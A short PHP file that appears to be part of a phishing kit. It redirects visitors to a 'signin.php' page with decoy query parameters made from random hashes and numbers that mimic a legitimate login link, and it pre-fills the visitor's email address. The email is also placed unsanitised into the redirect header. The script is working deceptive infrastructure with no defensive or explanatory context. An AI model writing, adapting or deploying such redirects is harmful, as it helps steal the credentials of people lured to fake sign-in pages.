<?php


if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];

header("Location: signin.php?websrc=".sha1(microtime()).sha1(microtime())."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
}else{
header("Location: signin.php?websrc=".sha1(microtime()).sha1(microtime())."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
}

?>
